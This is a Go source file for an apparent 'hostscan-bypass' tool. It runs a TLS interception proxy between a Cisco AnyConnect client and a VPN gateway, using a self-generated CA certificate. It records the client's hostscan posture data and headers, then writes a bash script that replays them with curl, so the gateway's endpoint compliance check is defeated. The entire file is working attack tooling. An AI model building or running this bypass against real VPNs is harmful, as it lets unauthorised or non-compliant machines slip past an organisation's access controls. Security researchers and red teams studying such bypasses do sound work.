package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"math/big"
	"net"
	"os"
	"time"
	"log"
	"strings"
)

type TLS struct {
	Country    []string "GB"
	Org        []string "hostscan"
	CommonName string   "*.domain.com"
}

type Config struct {
	Remotehost string
	Localhost  string
	Localport  int
	TLS        *TLS
	CertFile   string ""
	OutputFile string
}

type Hostscan struct {
	UserAgent  string
	Plat	   string
	Endpoint   string
}

var CSD_Script = `#!/bin/bash
# Generated by hostscan-bypass.go
#
# Github repo: https://github.com/Gilks/hostscan-bypass
# Blog post: https://gilks.github.io/post/cisco-hostscan-bypass
#
# You can find a list of hostscan requirements here:
# https://<VPN Page>/CACHE/sdesktop/data.xml

function run_curl
{
    curl \
        --insecure \
        --user-agent "$useragent" \
        --header "X-Transcend-Version: 1" \
        --header "X-Aggregate-Auth: 1" \
        --header "X-AnyConnect-Platform: $plat" \
        --cookie "sdesktop=$token" \
        "$@"
}

set -e

host=https://$CSD_HOSTNAME
plat="<PLAT>"
useragent="<USERAGENT>"
token=$CSD_TOKEN

run_curl --data-ascii @- "$host/+CSCOE+/sdesktop/scan.xml?reusebrowser=1" <<-END
<ENDPOINT>
END

exit 0
`

var config Config
var ids = 0

func genCert() ([]byte, *rsa.PrivateKey) {
	ca := &x509.Certificate{
		SerialNumber: big.NewInt(1653),
		Subject: pkix.Name{
			Country:      config.TLS.Country,
			Organization: config.TLS.Org,
			CommonName:   config.TLS.CommonName,
		},
		NotBefore:             time.Now(),
		NotAfter:              time.Now().AddDate(10, 0, 0),
		SubjectKeyId:          []byte{1, 2, 3, 4, 5},
		BasicConstraintsValid: true,
		IsCA:        true,
		ExtKeyUsage: []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth, x509.ExtKeyUsageServerAuth},
		KeyUsage:    x509.KeyUsageDigitalSignature | x509.KeyUsageCertSign,
	}

	priv, _ := rsa.GenerateKey(rand.Reader, 1024)
	pub := &priv.PublicKey
	ca_b, err := x509.CreateCertificate(rand.Reader, ca, ca, pub, priv)
	if err != nil {
		fmt.Println("create ca failed", err)
	}
	return ca_b, priv
}

func handleServerMessage(connR, connC net.Conn, id int) {
	for {
		data := make([]byte, 2048)
		n, err := connR.Read(data)
		if n > 0 {
			connC.Write(data[:n])
			//fmt.Printf("From Server [%d]:\n%s\n", id, hex.Dump(data[:n]))
			//fmt.Printf("From Server:\n%s\n",hex.EncodeToString(data[:n]))
		}
		if err != nil && err != io.EOF {
			fmt.Println(err)
			break
		}
	}
}

func handleConnection(conn net.Conn, isTLS bool, hostscan Hostscan) {
	var err error
	var connR net.Conn

	if isTLS == true {
		conf := tls.Config{InsecureSkipVerify: true}
		connR, err = tls.Dial("tcp", config.Remotehost, &conf)
	} else {
		connR, err = net.Dial("tcp", config.Remotehost)
	}

	if err != nil {
		return
	}

	fmt.Printf("[*][%d] Connected to server: %s\n", ids, connR.RemoteAddr())
	id := ids
	ids++
	go handleServerMessage(connR, conn, id)
	for {
		data := make([]byte, 2048)
		n, err := conn.Read(data)
		if n > 0 {
			fmt.Printf("From Client [%d]:\n%s\n", id, hex.Dump(data[:n]))
			//fmt.Printf("From Client:\n%s\n",hex.EncodeToString(data[:n]))

			var StrResp = hex.EncodeToString(data[:n])
			decoded, err := hex.DecodeString(StrResp)
			if err != nil {
				log.Fatal(err)
			}

			//fmt.Printf("%s\n", decoded)
			var ClientReq = string(decoded)
			if strings.Contains(ClientReq, "endpoint") {
				hostscan.Endpoint += ClientReq
			}

			if strings.Contains(ClientReq, "User-Agent:") && strings.Contains(ClientReq, "X-AnyConnect-Platform:")  {
				//fmt.Print(ClientReq)
				headers := strings.Split(ClientReq, "\r\n")

				for i := range headers {
					if strings.Contains(headers[i], "User-Agent:") {
						hostscan.UserAgent = strings.Split(headers[i],": ")[1]
						CSD_Script = strings.Replace(CSD_Script, "<USERAGENT>", hostscan.UserAgent, 1)
					}
					if strings.Contains(headers[i], "X-AnyConnect-Platform:") {
						hostscan.Plat = strings.Split(headers[i],": ")[1]
						CSD_Script = strings.Replace(CSD_Script, "<PLAT>", hostscan.Plat, 1)
					}
				}
			}
			connR.Write(data[:n])
			_ = hex.Dump(data[:n])
		}
		if err != nil && err == io.EOF {
			if hostscan.Endpoint != "" {
				CSD_Script = strings.Replace(CSD_Script, "<ENDPOINT>", hostscan.Endpoint, 1)
				script, err := os.Create(config.OutputFile)
				if err != nil {
					panic(err)
				}
				fmt.Fprintf(script, CSD_Script)
				script.Close()
				fmt.Print("\n[+] Successfully created CSD to bypass hostscan!\n")
				fmt.Printf("[+] Output File: %s\n", config.OutputFile)
				os.Exit(0)
			}
			fmt.Println(err)
			break
		}
	}
	connR.Close()
	conn.Close()
}

func startListener(isTLS bool) {

	var err error
	var conn net.Listener
	var cert tls.Certificate
	var hostscan = Hostscan{}

	if isTLS == true {
		if config.CertFile != "" {
			cert, _ = tls.LoadX509KeyPair(fmt.Sprint(config.CertFile, ".pem"), fmt.Sprint(config.CertFile, ".key"))
		} else {
			ca_b, priv := genCert()
			cert = tls.Certificate{
				Certificate: [][]byte{ca_b},
				PrivateKey:  priv,
			}
		}

		conf := tls.Config{
			Certificates: []tls.Certificate{cert},
		}
		conf.Rand = rand.Reader

		conn, err = tls.Listen("tcp", fmt.Sprint(config.Localhost, ":", config.Localport), &conf)

	} else {
		conn, err = net.Listen("tcp", fmt.Sprint(config.Localhost, ":", config.Localport))
	}

	if err != nil {
		panic("failed to connect: " + err.Error())
	}

	fmt.Println("[*] Listening for AnyConnect client connection..")

	for {
		cl, err := conn.Accept()
		if err != nil {
			fmt.Printf("server: accept: %s", err)
			break
		}
		fmt.Printf("[*] Accepted from: %s\n", cl.RemoteAddr())
		go handleConnection(cl, isTLS, hostscan)
	}
	conn.Close()
}

func setConfig(configFile string, localPort int, localHost, remoteHost string, certFile string, outputFile string) {
	if configFile != "" {
		data, err := ioutil.ReadFile(configFile)
		if err != nil {
			fmt.Println("[-] Not a valid config file: ", err)
			os.Exit(1)
		}
		err = json.Unmarshal(data, &config)
		if err != nil {
			fmt.Println("[-] Not a valid config file: ", err)
			os.Exit(1)
		}
	} else {
		config = Config{TLS: &TLS{}}
	}

	if certFile != "" {
		config.CertFile = certFile
	}

	if localPort != 0 {
		config.Localport = localPort
	}
	if localHost != "" {
		config.Localhost = localHost
	}
	if remoteHost != "" {
		config.Remotehost = remoteHost
	}
	if outputFile == "" {
		config.OutputFile = "hostscan-bypass.sh"
	} else if strings.HasSuffix(outputFile, ".sh") {
		config.OutputFile = outputFile
	} else {
		config.OutputFile = outputFile + ".sh"
	}

}

func main() {
	localPort := flag.Int("p", 0, "Local Port to listen on")
	localHost := flag.String("l", "", "Local address to listen on")
	remoteHostPtr := flag.String("r", "", "Remote Server address host:port")
	configPtr := flag.String("c", "", "Use a config file (set TLS ect) - Commandline params overwrite config file")
	tlsPtr := flag.Bool("s", false, "Create a TLS Proxy")
	certFilePtr := flag.String("cert", "", "Use a specific certificate file")
	outputFile := flag.String("o", "", "Output name for CSD hostscan bypass")

	flag.Parse()

	setConfig(*configPtr, *localPort, *localHost, *remoteHostPtr, *certFilePtr, *outputFile)

	if config.Remotehost == "" {
		fmt.Println("[-] Remote host required")
		flag.PrintDefaults()
		os.Exit(1)
	}

	startListener(*tlsPtr)
}
